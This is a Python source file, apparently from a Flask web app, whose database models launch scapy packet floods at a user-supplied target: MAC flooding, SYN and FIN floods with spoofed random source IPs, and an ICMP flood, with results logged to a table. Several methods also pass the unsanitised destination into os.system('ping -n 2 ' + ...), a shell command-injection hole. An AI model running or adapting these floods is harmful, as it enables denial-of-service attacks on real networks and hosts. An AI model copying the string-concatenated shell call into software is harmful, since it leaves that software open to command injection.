from scapy.layers.inet import IP, ICMP, TCP
from scapy.layers.l2 import Ether
from ping3 import ping,verbose_ping
from app import db
from scapy.all import *
import os

class Attack(db.Model):
  __tablename__ = 'attack'
  id = db.Column(db.Integer, primary_key=True, autoincrement=True)
  destination = db.Column(db.String(20))
  attacktype=db.Column(db.String(20))
  attacknum=db.Column(db.Integer)

  def __init__(self, destination,attacktype,attacknum):
    self.destination = destination
    self.attacktype=attacktype
    self.attacknum=attacknum

  def create(self):
    db.session.add(self)
    db.session.commit()
    return self

  def mac_attack(self):
    iface='eth0'
    total=0
    for i in range(self.attacknum):
      randmac=RandMAC()
      randip=RandIP()
      packet=Ether(src=randmac,dst=self.destination)/IP(src=randip,dst=randip)
      send(packet)
      total+=1
    return total

  def syn_attack(self):
    total=0
    exit_code=os.system('ping -n 2 '+self.destination)
    print(exit_code)
    if exit_code:
      return 0
    else:
      for i in range(self.attacknum):
        randip=RandIP()
        #print("123344")
        randport=random.randint(1,65535)
        packet=IP(src=randip,dst=self.destination)/TCP(sport=randport,dport=80,flags='S')
        send(packet)
        total+=1
    return total

  def fin_attack(self):
    total=0
    print(self.destination)
    exit_code = os.system('ping -n 2 ' + self.destination)
    print(exit_code)
    if exit_code:
      return 0
    else:
      for i in range(self.attacknum):
        randip=RandIP()
        randport=random.randint(1,65535)
        packet=IP(src=randip,dst=self.destination)/TCP(sport=randport,dport=80,flags='F')
        send(packet)
        total+=1
    return total

  def icmp_attack(self):
    total=0
    exit_code = os.system('ping -n 2 ' + self.destination)
    print(exit_code)
    if exit_code:
      return 0
    else:
      for i in range(self.attacknum):
        randip=RandIP()
        packet=IP(src=randip,dst=self.destination)/ICMP(type=8)
        send(packet)
        total+=1
    return total


class AttackResult(db.Model):
  __tablename__ = 'attackresult'
  result_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
  destination = db.Column(db.String(20))
  attacknum = db.Column(db.Integer)
  attacktype = db.Column(db.String(20))
  result = db.Column(db.String(20))
  task_id=db.Column(db.Integer,db.ForeignKey('attack.id'))

  def __init__(self,destination,attacknum, attacktype,result, task_id):
    self.destination=destination
    self.attacknum=attacknum
    self.attacktype=attacktype
    self.result = result
    self.task_id = task_id

  def create(self):
    db.session.add(self)
    db.session.commit()
    return self


